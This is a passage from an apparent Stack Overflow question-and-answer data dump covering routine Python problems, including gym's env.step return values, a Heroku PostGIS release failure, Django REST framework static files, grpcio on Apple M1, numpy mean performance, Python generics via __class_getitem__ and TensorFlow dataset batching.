args = parser.parse_args([&quot;--&quot;, &quot;--&quot;, &quot;--&quot;])

print(args)
</code></pre>
<p>prints</p>
<pre><code>Namespace(a='--', b=[])
</code></pre>
<p>because when <code>_get_values</code> handles the <code>b</code> argument, it receives <code>['--']</code> as <code>arg_strings</code> and removes the <code>'--'</code>. When handling the <code>a</code> argument, it receives <code>['--', '--']</code>, representing one end-of-options marker and one actual <code>--</code> argument value, and it successfully removes the end-of-options marker, but when handling <code>b</code>, it removes the actual argument value.</p>
"
"73195438","1","OpenAI GYM's env.step(): what are the values?","<p>I am getting to know OpenAI's GYM (0.25.1) using Python3.10 with gym's environment set to <code>'FrozenLake-v1</code> (code below).</p>
<p>According to the <a href=""https://www.gymlibrary.ml/"" rel=""noreferrer"">documentation</a>, calling <code>env.step()</code> should return a tuple containing 4 values (observation, reward, done, info). However, when running my code accordingly, I get a ValueError:</p>
<p>Problematic code:</p>
<pre><code>observation, reward, done, info = env.step(new_action)
</code></pre>
<p>Error:</p>
<pre><code>      3 new_action = env.action_space.sample()
----&gt; 5 observation, reward, done, info = env.step(new_action)
      7 # here's a look at what we get back
      8 print(f&quot;observation: {observation}, reward: {reward}, done: {done}, info: {info}&quot;)

ValueError: too many values to unpack (expected 4)
</code></pre>
<p>Adding one more variable fixes the error:</p>
<pre><code>a, b, c, d, e = env.step(new_action)
print(a, b, c, d, e)
</code></pre>
<p>Output:</p>
<pre><code>5 0 True True {'prob': 1.0}
</code></pre>
<p>My interpretation:</p>
<ul>
<li><code>5</code> should be observation</li>
<li><code>0</code> is reward</li>
<li><code>prob: 1.0</code> is info</li>
<li>One of the <code>True</code>'s is done</li>
</ul>
<p>So what's the leftover boolean standing for?</p>
<p>Thank you for your help!</p>
<hr />
<p>Complete code:</p>
<pre><code>import gym

env = gym.make('FrozenLake-v1', new_step_api=True, render_mode='ansi') # build environment

current_obs = env.reset() # start new episode

for e in env.render():
    print(e)
    
new_action = env.action_space.sample() # random action

observation, reward, done, info = env.step(new_action) # perform action, ValueError!

for e in env.render():
    print(e)
</code></pre>
","73195616","<p>From <a href=""https://github.com/openai/gym/blob/master/gym/core.py"" rel=""nofollow noreferrer"">the code's docstrings</a>:</p>
<blockquote>
<pre><code>       Returns:
           observation (object): this will be an element of the environment's :attr:`observation_space`.
               This may, for instance, be a numpy array containing the positions and velocities of certain objects.
           reward (float): The amount of reward returned as a result of taking the action.
           terminated (bool): whether a `terminal state` (as defined under the MDP of the task) is reached.
               In this case further step() calls could return undefined results.
           truncated (bool): whether a truncation condition outside the scope of the MDP is satisfied.
               Typically a timelimit, but could also be used to indicate agent physically going out of bounds.
               Can be used to end the episode prematurely before a `terminal state` is reached.
           info (dictionary): `info` contains auxiliary diagnostic information (helpful for debugging, learning, and logging).
               This might, for instance, contain: metrics that describe the agent's performance state, variables that are
               hidden from observations, or individual reward terms that are combined to produce the total reward.
               It also can contain information that distinguishes truncation and termination, however this is deprecated in favour
               of returning two booleans, and will be removed in a future version.
           (deprecated)
           done (bool): A boolean value for if the episode has ended, in which case further :meth:`step` calls will return undefined results.
               A done signal may be emitted for different reasons: &gt;Maybe the task underlying the environment was solved successfully,
               a certain timelimit was exceeded, or the physics &gt;simulation has entered an invalid state.
</code></pre>
</blockquote>
<p>It appears that the first boolean represents a <code>terminated</code> value, i.e. &quot;whether a <code>terminal state</code> (as defined under the MDP of the task) is reached. In this case further step() calls could return undefined results.&quot;</p>
<p>It appears that the second represents whether the value has been <code>truncated</code>, i.e. did your agent go out of bounds or not? From the docstring:</p>
<blockquote>
<p>&quot;whether a truncation condition outside the scope of the MDP is satisfied. Typically a timelimit, but could also be used to indicate agent physically going out of bounds. Can be used to end the episode prematurely before a <code>terminal state</code> is reached.&quot;</p>
</blockquote>
"
"73206939","1","Heroku postgres postgis - django releases fail with: relation ""spatial_ref_sys"" does not exist","<p>Heroku changed their PostgreSQL extension schema management on 01 August 2022. (<a href=""https://devcenter.heroku.com/changelog-items/2446"" rel=""noreferrer"">https://devcenter.heroku.com/changelog-items/2446</a>)</p>
<p>Since then every deployment to Heroku of our existing django 4.0 application fails during the release phase, the build succeeds.</p>
<p>Has anyone experienced the same issue?
Is there a workaround to push new release to Heroku except reinstalling the postgis extension?</p>
<p>If I understand the changes right, Heroku added a schema called &quot;heroku_ext&quot; for newly created extensions. As the extension is existing in our case, it should not be affected.</p>
<blockquote>
<p>All currently installed extensions will continue to work as intended.</p>
</blockquote>
<p>Following the full logs of an release via git push:</p>
<pre><code>git push staging develop:master
Gesamt 0 (Delta 0), Wiederverwendet 0 (Delta 0), Pack wiederverwendet 0
remote: Compressing source files... done.
remote: Building source:
remote: 
remote: -----&gt; Building on the Heroku-20 stack
remote: -----&gt; Using buildpacks:
remote:        1. https://github.com/heroku/heroku-geo-buildpack.git
remote:        2. heroku/python
remote: -----&gt; Geo Packages (GDAL/GEOS/PROJ) app detected
remote: -----&gt; Installing GDAL-2.4.0
remote: -----&gt; Installing GEOS-3.7.2
remote: -----&gt; Installing PROJ-5.2.0
remote: -----&gt; Python app detected
remote: -----&gt; Using Python version specified in runtime.txt
remote: -----&gt; No change in requirements detected, installing from cache
remote: -----&gt; Using cached install of python-3.9.13
remote: -----&gt; Installing pip 22.1.2, setuptools 60.10.0 and wheel 0.37.1
remote: -----&gt; Installing SQLite3
remote: -----&gt; Installing requirements with pip
remote: -----&gt; Skipping Django collectstatic since the env var DISABLE_COLLECTSTATIC is set.
remote: -----&gt; Discovering process types
remote:        Procfile declares types -&gt; release, web, worker
remote: 
remote: -----&gt; Compressing...
remote:        Done: 156.1M
remote: -----&gt; Launching...
remote:  !     Release command declared: this new release will not be available until the command succeeds.
remote:        Released v123
remote:        https://myherokuapp.herokuapp.com/ deployed to Heroku
remote: 
remote: This app is using the Heroku-20 stack, however a newer stack is available.
remote: To upgrade to Heroku-22, see:
remote: https://devcenter.heroku.com/articles/upgrading-to-the-latest-stack
remote: 
remote: Verifying deploy... done.
remote: Running release command...
remote: 
remote: Traceback (most recent call last):
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py&quot;, line 87, in _execute
remote:     return self.cursor.execute(sql)
remote: psycopg2.errors.UndefinedTable: relation &quot;spatial_ref_sys&quot; does not exist
remote: 
remote: 
remote: The above exception was the direct cause of the following exception:
remote: 
remote: Traceback (most recent call last):
remote:   File &quot;/app/manage.py&quot;, line 22, in &lt;module&gt;
remote:     main()
remote:   File &quot;/app/manage.py&quot;, line 18, in main
remote:     execute_from_command_line(sys.argv)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py&quot;, line 446, in execute_from_command_line
remote:     utility.execute()
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/__init__.py&quot;, line 440, in execute
remote:     self.fetch_command(subcommand).run_from_argv(self.argv)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py&quot;, line 414, in run_from_argv
remote:     self.execute(*args, **cmd_options)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py&quot;, line 460, in execute
remote:     output = self.handle(*args, **options)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/base.py&quot;, line 98, in wrapped
remote:     res = handle_func(*args, **kwargs)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/core/management/commands/migrate.py&quot;, line 106, in handle
remote:     connection.prepare_database()
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/contrib/gis/db/backends/postgis/base.py&quot;, line 26, in prepare_database
remote:     cursor.execute(&quot;CREATE EXTENSION IF NOT EXISTS postgis&quot;)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/sentry_sdk/integrations/django/__init__.py&quot;, line 544, in execute
remote:     return real_execute(self, sql, params)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py&quot;, line 67, in execute
remote:     return self._execute_with_wrappers(
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py&quot;, line 80, in _execute_with_wrappers
remote:     return executor(sql, params, many, context)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py&quot;, line 89, in _execute
remote:     return self.cursor.execute(sql, params)
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/utils.py&quot;, line 91, in __exit__
remote:     raise dj_exc_value.with_traceback(traceback) from exc_value
remote:   File &quot;/app/.heroku/python/lib/python3.9/site-packages/django/db/backends/utils.py&quot;, line 87, in _execute
remote:     return self.cursor.execute(sql)
remote: django.db.utils.ProgrammingError: relation &quot;spatial_ref_sys&quot; does not exist
remote: 
remote: Sentry is attempting to send 2 pending error messages
remote: Waiting up to 2 seconds
remote: Press Ctrl-C to quit
remote: Waiting for release.... failed.
To https://git.heroku.com/myherokuapp
</code></pre>
","73220201","<p>I've worked around it by overwriting the postgis/base.py engine, I've put the following in my app under <code>db/base.py</code></p>
<pre><code>from django.contrib.gis.db.backends.postgis.base import (
     DatabaseWrapper as PostGISDatabaseWrapper,
)

class DatabaseWrapper(PostGISDatabaseWrapper):
    def prepare_database(self):
        # This is the overwrite - we don't want to call the
        # super() because of a faulty extension creation
     pass
</code></pre>
<p>Then in my settings I've just pointed the <code>DATABASES[&quot;engine&quot;] = &quot;app.db&quot;</code></p>
<p>It won't help with backups but at least I can release again.</p>
"
"74819091","1","Single ""="" after dependency version specifier in setup.py","<p>I'm looking at a <code>setup.py</code> with this syntax:</p>
<pre><code>from setuptools import setup

setup(
...
    tests_require=[&quot;h5py&gt;=2.9=mpi*&quot;,
                   &quot;mpi4py&quot;]
)
</code></pre>
<p>I understand the idea of the &quot;&gt;=&quot; where <code>h5py</code> should be at least version 2.9, but I cannot for the life of me understand the <code>=mpi*</code> afterwards. Is it saying the version should somehow match the mpi version, while also being at least 2.9?</p>
<p>I can't find anything that explains specifying python package versions that also explains the use of a single <code>=</code>.</p>
<p>The only other place I've found it used is some obscure blog post that seemed to imply it was sort of like importing the package with an alias, which doesn't make much sense to me; and also the <a href=""https://mpi4py-fft.readthedocs.io/en/latest/installation.html"" rel=""nofollow noreferrer"">mpi4py docs</a> that include a command line snippet <code>conda install -c conda-forge h5py=*=mpi* netcdf4=*=mpi*</code> but don't really explain it.</p>
","74819586","<h4>Short answer</h4>
<p>The <code>=mpi*</code> qualifier says that you want to install <code>h5py</code> pre-compiled with MPI support.</p>
<h4>Details</h4>
<p>If you look at the documentation for h5py, you'll see references to having to build it with or without MPI explicitly (e.g., see <a href=""https://docs.h5py.org/en/latest/build.html"" rel=""nofollow noreferrer"">https://docs.h5py.org/en/latest/build.html</a>).</p>
<p>When you look at the conda-forge download files (<a href=""https://anaconda.org/conda-forge/h5py/files"" rel=""nofollow noreferrer"">https://anaconda.org/conda-forge/h5py/files</a>) you'll also see that there are a bunch of <code>nompi</code> variants and a bunch of <code>mpi</code> variants.</p>
<p>Adding <code>=mpi*</code> triggers getting a version that's been compiled with MPI so that you get parallel MPI support, while I suspect the default version would come without MPI support.</p>
<h4>Experimentation with and without</h4>
<p>When I do <code>conda install -c conda-forge h5py=3.7</code>, conda proposes to download this bundle:</p>
<pre><code>h5py-3.7.0-nompi_py39hd4deaf1_100
</code></pre>
<p>But when I did <code>conda install =c conda-forget h5py=3.7=mpi*</code>, I expected a <code>...-mpi_py...</code> bundle but instead it just failed because I'm on Windows and MPI is not supported on Windows as far as I can tell. (And that makes sense, HPC clusters with MPI run on Linux.)</p>
"
"73406581","1","python manage.py collectstatic error: cannot find rest_framework bootstrap.min.css.map (from book 'Django for APIs')","<p>I am reading the book 'Django for APIs' from 'William S. Vincent' (current edition for Django 4.0)</p>
<p>In chapter 4, I cannot run successfully the command python manage.py collectstatic.</p>
<p>I get the following error:</p>
<pre><code>Traceback (most recent call last):
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/manage.py&quot;, line 22, in &lt;module&gt;
    main()
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/manage.py&quot;, line 18, in main
    execute_from_command_line(sys.argv)
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py&quot;, line 446, in execute_from_command_line
    utility.execute()
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/__init__.py&quot;, line 440, in execute
    self.fetch_command(subcommand).run_from_argv(self.argv)
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py&quot;, line 402, in run_from_argv
    self.execute(*args, **cmd_options)
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/core/management/base.py&quot;, line 448, in execute
    output = self.handle(*args, **options)
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py&quot;, line 209, in handle
    collected = self.collect()
  File &quot;/Users/my_name/Projects/django/django_for_apis/library/.venv/lib/python3.10/site-packages/django/contrib/staticfiles/management/commands/collectstatic.py&quot;, line 154, in collect
    raise processed
whitenoise.storage.MissingFileError: The file 'rest_framework/css/bootstrap.min.css.map' could not be found with &lt;whitenoise.storage.CompressedManifestStaticFilesStorage object at 0x102fa07f0&gt;.

The CSS file 'rest_framework/css/bootstrap.min.css' references a file which could not be found:
  rest_framework/css/bootstrap.min.css.map

Please check the URL references in this CSS file, particularly any
relative paths which might be pointing to the wrong location. 
</code></pre>
<p>I have the exact same settings like in the book in settings.py:</p>
<pre><code>STATIC_URL = &quot;static/&quot;
STATICFILES_DIRS = [BASE_DIR / &quot;static&quot;]  # new
STATIC_ROOT = BASE_DIR / &quot;staticfiles&quot;  # new
STATICFILES_STORAGE = &quot;whitenoise.storage.CompressedManifestStaticFilesStorage&quot;  # new
</code></pre>
<p>I couldn't find any explanation for it. maybe someone can point me in the right direction.</p>
","73411956","<p><strong>Update</strong>: <a href=""https://www.django-rest-framework.org/community/release-notes/#3140"" rel=""noreferrer"">DRF 3.14.0 now supports Django 4.1</a>. If you've added stubs to static as per below, be sure to remove them.</p>
<p>This appears to be related to Django 4.1: either downgrade to Django 4.0 or <a href=""https://github.com/encode/django-rest-framework/pull/8591#issuecomment-1220200518"" rel=""noreferrer"">simply create the following empty files in one of your static directories</a>:</p>
<pre><code>static/rest_framework/css/bootstrap-theme.min.css.map
static/rest_framework/css/bootstrap.min.css.map
</code></pre>
<p><a href=""https://docs.djangoproject.com/en/4.1/releases/4.1/#django-contrib-staticfiles"" rel=""noreferrer"">There's a recent change to <code>ManifestStaticFilesStorage</code></a> where it now attempts to replace source maps with their hashed counterparts.</p>
<p>Django REST framework has only recently added the bootstrap css source maps but is not yet released.</p>
"
"72620996","1","Apple M1 - Symbol not found: _CFRelease while running Python app","<p>I am hoping to run my app without any problem, but I got this attached error. Could someone help or point me into the right direction as to why this is happening?</p>
<pre><code>Traceback (most recent call last):
  File &quot;/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/main.py&quot;, line 4, in &lt;module&gt;
    from configurations import config  # noqa # pylint: disable=unused-import
  File &quot;/Users/andre.sitorus/Documents/GitHub/nexus/automation-api/app/configurations/config.py&quot;, line 7, in &lt;module&gt;
    from google.cloud import secretmanager
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager.py&quot;, line 20, in &lt;module&gt;
    from google.cloud.secretmanager_v1 import SecretManagerServiceClient
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/__init__.py&quot;, line 24, in &lt;module&gt;
    from google.cloud.secretmanager_v1.gapic import secret_manager_service_client
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/cloud/secretmanager_v1/gapic/secret_manager_service_client.py&quot;, line 25, in &lt;module&gt;
    import google.api_core.gapic_v1.client_info
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/__init__.py&quot;, line 18, in &lt;module&gt;
    from google.api_core.gapic_v1 import config
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/google/api_core/gapic_v1/config.py&quot;, line 23, in &lt;module&gt;
    import grpc
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/__init__.py&quot;, line 22, in &lt;module&gt;
    from grpc import _compression
  File &quot;/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_compression.py&quot;, line 15, in &lt;module&gt;
    from grpc._cython import cygrpc
ImportError: dlopen(/Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so, 2): Symbol not found: _CFRelease
  Referenced from: /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so
  Expected in: flat namespace
 in /Users/andre.sitorus/opt/miniconda3/envs/nexus/lib/python3.9/site-packages/grpc/_cython/cygrpc.cpython-39-darwin.so
</code></pre>
<p>I'm running  this in Apple M1.</p>
<p>I already upgraded pip and setuptools before installing all the requirements in my virtual environment using <code>conda</code>. Here is my <code>python</code>, <code>pip</code>, and <code>setuptools</code> version:</p>
<pre><code>python 3.9.12
pip 21.2.4
setuptools 62.4.0
</code></pre>
","73245207","<p>Had the same issue; turned out it's because of the grpcio build. Doing this helped:</p>
<pre><code>pip uninstall grpcio
conda install grpcio
</code></pre>
<p>(Make sure you use the conda-forge channel with conda; the community puts in work to make sure packages play well with M1/arm64)</p>
"
"74842741","1","Why is a combination of numpy functions faster than np.mean?","<p>I am wondering what the fastest way for a mean computation is in numpy. I used the following code to experiment with it:</p>
<pre class=""lang-py prettyprint-override""><code>import time
n = 10000
p = np.array([1] * 1000000)

t1 = time.time()
for x in range(n):
    np.divide(np.sum(p), p.size)
t2 = time.time()

print(t2-t1)
</code></pre>
<p>3.9222593307495117</p>
<pre class=""lang-py prettyprint-override""><code>t3 = time.time()
for x in range(n):
    np.mean(p)
t4 = time.time()

print(t4-t3)
</code></pre>
<p>5.271147012710571</p>
<p>I would assume that np.mean would be faster or at least equivalent in speed, however it looks like the combination of numpy functions is faster than np.mean. Why is the combination of numpy functions faster?</p>
","74842967","<p>For integer input, by default, <code>numpy.mean</code> computes the sum in float64 dtype. This prevents overflow errors, but it requires a conversion for every element.</p>
<p>Your code with <code>numpy.sum</code> only converts once, after the sum has been computed.</p>
"
"73821277","1","Generate Permutation With Minimum Guaranteed Distance from Elements in Source","<p>Given a sequence <code>a</code> with <code>n</code> unique elements, I want to create a sequence <code>b</code> which is a randomly selected permutation of <code>a</code> such that there is at least a specified minimum distance <code>d</code> between duplicate elements of the sequence which is <code>b</code> appended to <code>a</code>.</p>
<p>For example, if <code>a = [1,2,3]</code> and <code>d = 2</code>, of the following permutations:</p>
<pre><code>a         b
[1, 2, 3] (1, 2, 3) mindist = 3
[1, 2, 3] (1, 3, 2) mindist = 2
[1, 2, 3] (2, 1, 3) mindist = 2
[1, 2, 3] (2, 3, 1) mindist = 2
[1, 2, 3] (3, 1, 2) mindist = 1
[1, 2, 3] (3, 2, 1) mindist = 1
</code></pre>
<p><code>b</code> could only take one of the first four values since the minimum distance for the last two is <code>1 &lt; d</code>.</p>
<p>I wrote the following implementation:</p>
<pre><code>import random
n = 10
alist = list(range(n))

blist = alist[:]

d = n//2

avail_indices = list(range(n))
for a_ind, a_val in enumerate(reversed(alist)):
  min_ind = max(d - a_ind - 1, 0)
  new_ind = random.choice(avail_indices[min_ind:])
  avail_indices.remove(new_ind)
  blist[new_ind] = a_val
print(alist, blist)
</code></pre>
<pre><code>[0, 1, 2, 3, 4, 5, 6, 7, 8, 9] [1, 3, 2, 8, 5, 6, 4, 0, 9, 7]
</code></pre>
<p>but I think this is <code>n^2</code> time complexity (not completely sure). Here's a plot of the time required as <code>n</code> increases for <code>d = n//2</code>:</p>
<p><a href=""https://i.stack.imgur.com/FtmwP.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/FtmwP.png"" alt=""enter image description here"" /></a></p>
<p>Is it possible to do better than this?</p>
","73821711","<p>Yes, your implementation is <code>O(n^2)</code>.</p>
<p>You can adapt the <a href=""https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle"" rel=""nofollow noreferrer"">Fisher-Yates shuffle</a> to this purpose.  What you do is work from the start of an array to the end, placing the final value into place out of the remaining.</p>
<p>The trick is that while in a full shuffle you can place any element at the start, you can only place from an index that respects the distance condition.</p>
<p>Here is an implementation.</p>
<pre><code>import random

def distance_permutation (orig, d):
    answer = orig.copy()
    for i in range(len(orig)):
        choice = random.randrange(i, min(len(orig), len(orig) + i - d + 1))
        if i &lt; choice:
            (answer[i], answer[choice]) = (answer[choice], answer[i])
    return answer


n = 10
x = list(range(n))
print(x, distance_permutation(x, n//2))
</code></pre>
"
"73464414","1","Why are generics in Python implemented using __class_getitem__ instead of __getitem__ on metaclass","<p>I was reading python documentation and peps and couldn't find an answer for this.</p>
<p>Generics in python are implemented by subscripting class objects. <code>list[str]</code> is a list where all elements are strings.<br />
This behaviour is achieved by implementing a special (dunder) classmethod called <code>__class_getitem__</code> which as the <a href=""https://docs.python.org/3/reference/datamodel.html?highlight=__class_getitem__#class-getitem-versus-getitem"" rel=""nofollow noreferrer"">documentation</a> states should return a GenericAlias.</p>
<p>An example:</p>
<pre><code>class MyGeneric:
    def __class_getitem__(cls, key):
        # implement generics
        ...
</code></pre>
<p>This seems weird to me because the documentation also shows some code similar to what the interpreter does when faced with subscripting objects and shows that defining both <code>__getitem__</code> on object's metaclass and <code>__class_getitem__</code> on the object itself always chooses the metaclass' <code>__getitem__</code>. This means that a class with the same functionality as the one above can be implemented without introducing a new special method into the language.</p>
<p>An example of a class with identical behaviour:</p>
<pre><code>class GenericMeta(type):
    def __getitem__(self, key):
        # implement generics
        ...


class MyGeneric(metaclass=GenericMeta):
    ...
</code></pre>
<p>Later the documentation also shows an example of <code>Enum</code>s using a <code>__getitem__</code> of a metaclass as an example of a <code>__class_getitem__</code> not being called.</p>
<p>My question is why was the <code>__class_getitem__</code> classmethod introduced in the first place?</p>
<p>It seems to do the exact same thing as the metaclass' <code>__getitem__</code> but with the added complexity and the need for extra code in the interpreter for deciding which method to call. All of this comes with no extra benefit as defining both will simply call the same one every time unless specifically calling dunder methods (which should not be done in general).</p>
<p>I know that implementing generics this way is discouraged. The general approach is to subclass a class that already defines a <code>__class_getitem__</code> like <code>typing.Generic</code> but I'm still curious as to why that functionality was implemented that way.</p>
","73464466","<p><code>__class_getitem__</code> exists because using multiple inheritance where multiple metaclasses are involved is very tricky and sets limitations that can’t always be met when using 3rd-party libraries.</p>
<p>Without <code>__class_getitem__</code> generics requires a metaclass, as defining a  <code>__getitem__</code> method on a class would only handle attribute access <strong>on instances</strong>, not on the class. Normally, <code>object[...]</code> syntax is handled by the <em>type</em> of <code>object</code>, not by <code>object</code> itself. For instances, that's the class, but for <em>classes</em>, that's the metaclass.</p>
<p>So, the syntax:</p>
<pre><code>ClassObject[some_type]
</code></pre>
<p>would translate to:</p>
<pre><code>type(ClassObject).__getitem__(ClassObject, some_type)
</code></pre>
<p><code>__class_getitem__</code> exists to avoid having to give every class that needs to support generics, a metaclass.</p>
<p>For how <code>__getitem__</code> and other special methods work, see the <a href=""https://docs.python.org/3/reference/datamodel.html#special-method-lookup"" rel=""noreferrer""><em>Special method lookup</em> section</a> in the Python Datamodel chapter:</p>
<blockquote>
<p>For custom classes, implicit invocations of special methods are only guaranteed to work correctly if defined on an object’s type, not in the object’s instance dictionary.</p>
</blockquote>
<p>The same chapter also explicitly covers <a href=""https://docs.python.org/3/reference/datamodel.html#the-purpose-of-class-getitem"" rel=""noreferrer""><code>__class_getitem__</code> versus <code>__getitem__</code></a>:</p>
<blockquote>
<p>Usually, the subscription of an object using square brackets will call the <code>__getitem__()</code> instance method defined on the object’s class. However, if the object being subscribed is itself a class, the class method <code>__class_getitem__()</code> may be called instead.</p>
</blockquote>
<p>This section also covers what will happen if the class has both a metaclass with a <code>__getitem__</code> method, <em>and</em> a <code>__class_getitem__</code> method defined on the class itself. You found this section, but it <strong>only applies in this specific corner-case</strong>.</p>
<p>As stated, using metaclasses can be tricky, especially when inheriting from classes with different metaclasses. See the original <a href=""https://peps.python.org/pep-0560/"" rel=""noreferrer"">PEP 560 - <em>Core support for typing module and generic types</em> proposal</a>:</p>
<blockquote>
<p>All generic types are instances of <code>GenericMeta</code>, so if a user uses a custom metaclass, then it is hard to make a corresponding class generic. This is particularly hard for library classes that a user doesn’t control.</p>
<p>...</p>
<p>With the help of the proposed special attributes the <code>GenericMeta</code> metaclass will not be needed.</p>
</blockquote>
<p>When mixing multiple classes with different metaclasses, Python requires that the most specific metaclass derives from the other metaclasses, a requirement that can't easily be met if the metaclass is not your own; see the <a href=""https://docs.python.org/3/reference/datamodel.html#determining-the-appropriate-metaclass"" rel=""noreferrer"">documentation on determining the appropriate metaclass</a>.</p>
<p>As a side note, if you do use a metaclass, then <code>__getitem__</code> should <strong>not</strong> be a classmethod:</p>
<pre><code>class GenericMeta(type):
    # not a classmethod! `self` here is a class, an instance of this
    # metaclass.
    def __getitem__(self, key):
        # implement generics
        ...
</code></pre>
<p>Before PEP 560, that's <a href=""https://github.com/python/cpython/blob/8d999cbf4adea053be6dbb612b9844635c4dfb8e/Lib/typing.py#L1099-L1143"" rel=""noreferrer"">basically what the <code>typing.GenericMeta</code> metaclass did</a>, albeit with a bit more complexity.</p>
"
"73569804","1","Dataset.batch doesn't work as expected with a zipped dataset","<p>I have a dataset like this:</p>
<pre><code>a = tf.data.Dataset.range(1, 16)
b = tf.data.Dataset.range(16, 32)
zipped = tf.data.Dataset.zip((a, b))
list(zipped.as_numpy_iterator())

# output: 
[(0, 16),
 (1, 17),
 (2, 18),
 (3, 19),
 (4, 20),
 (5, 21),
 (6, 22),
 (7, 23),
 (8, 24),
 (9, 25),
 (10, 26),
 (11, 27),
 (12, 28),
 (13, 29),
 (14, 30),
 (15, 31)]
</code></pre>
<p>When I apply <code>batch(4)</code> to it, the expected result is an array of batches, where each batch contains four tuples:</p>
<pre><code>[[(0, 16), (1, 17), (2, 18), (3, 19)],
 [(4, 20), (5, 21), (6, 22), (7, 23)],
 [(9, 24), (10, 25), (10, 26), (11, 27)],
 [(12, 28), (13, 29), (14, 30), (15, 31)]]
</code></pre>
<p>But this is what I receive instead:</p>
<pre><code>batched = zipped.batch(4)
list(batched.as_numpy_iterator())

# Output:
[(array([0, 1, 2, 3]), array([16, 17, 18, 19])), 
 (array([4, 5, 6, 7]), array([20, 21, 22, 23])), 
 (array([ 8,  9, 10, 11]), array([24, 25, 26, 27])), 
 (array([12, 13, 14, 15]), array([28, 29, 30, 31]))]
</code></pre>
<p>I'm following this <a href=""https://www.youtube.com/watch?v=N_W4EYtsa10&amp;t=5591s"" rel=""nofollow noreferrer"">tutorial</a>, he does the same steps but gets the correct output somehow.</p>
<hr />
<p>Update: according to the documentation this is the intended behavior:</p>
<blockquote>
<p>The components of the resulting element will have an additional <strong>outer</strong> dimension, which will be batch_size</p>
</blockquote>
<p>But it doesn't make any sense. To my understanding, dataset is a list of pieces of data. It doesn't matter the shape of those pieces of data, when we are batching it we are combining the elements [whatever their shape is] into batches, therefore it should always insert the new dimention to the second position (<code>(length, a, b, c)</code> -&gt; <code>(length', batch_size, a, b, c)</code>).</p>
<p>So my questions are: I wonder what is the purpose of <code>batch()</code> being implemented this way? And what is the alternative that does what I described?</p>
","73583522","<p>One thing you can try doing is something like this:</p>
<pre><code>import tensorflow as tf

a = tf.data.Dataset.range(16)
b = tf.data.Dataset.range(16, 32)
zipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.transpose([x, y]))

list(zipped.as_numpy_iterator())
</code></pre>
<pre><code>[array([[ 0, 16],
        [ 1, 17],
        [ 2, 18],
        [ 3, 19]]), 
 array([[ 4, 20],
        [ 5, 21],
        [ 6, 22],
        [ 7, 23]]), 
 array([[ 8, 24],
        [ 9, 25],
        [10, 26],
        [11, 27]]), 
 array([[12, 28],
        [13, 29],
        [14, 30],
        [15, 31]])]
</code></pre>
<p>but they are still not tuples. Or:</p>
<pre><code>zipped = tf.data.Dataset.zip((a, b)).batch(4).map(lambda x, y: tf.unstack(tf.transpose([x, y]), num = 4))
</code></pre>
<pre><code>[(array([ 0, 16]), array([ 1, 17]), array([ 2, 18]), array([ 3, 19])), (array([ 4, 20]), array([ 5, 21]), array([ 6, 22]), array([ 7, 23])), (array([ 8, 24]), array([ 9, 25]), array([10, 26]), array([11, 27])), (array([12, 28]), array([13, 29]), array([14, 30]), array([15, 31]))]
</code></pre>
"
"73285601","1","Docker : exec /usr/bin/sh: exec format error","<p>Hi guys need some help.</p>
<p>I created a custom docker image and push it to docker hub but when I run it in CI/CD it gives me this error.</p>
<p><code>exec /usr/bin/sh: exec format error</code></p>
<p>Where :</p>
<p><strong>Dockerfile</strong></p>
<pre><code>FROM ubuntu:20.04
RUN apt-get update
RUN apt-get install -y software-properties-common
RUN apt-get install -y python3-pip
RUN pip3 install robotframework
</code></pre>
<p><strong>.gitlab-ci.yml</strong></p>
<pre><code>robot-framework:
  image: rethkevin/rf:v1
  allow_failure: true
  script:
    - ls
    - pip3 --version
</code></pre>
<p><strong>Output</strong></p>
<pre><code>Running with gitlab-runner 15.1.0 (76984217)
  on runner zgjy8gPC
Preparing the &quot;docker&quot; executor
Using Docker executor with image rethkevin/rf:v1 ...
